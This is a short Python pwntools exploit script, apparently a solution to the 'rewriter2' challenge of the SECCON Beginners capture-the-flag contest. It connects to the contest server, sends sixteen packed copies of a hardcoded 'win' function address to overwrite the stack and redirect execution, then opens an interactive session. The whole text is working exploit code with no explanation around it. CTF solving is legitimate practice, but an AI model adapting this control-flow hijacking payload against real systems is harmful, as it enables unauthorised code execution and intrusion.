from pwn import *

io = remote('rewriter2.beginners.seccon.games', 9001)

win = 0x00000000004012c2

print(pack(win) * 16)
print(io.recvuntil(b"?"))
io.sendline(pack(win) * 16)
print(io.recvuntil(b"?"))
io.interactive()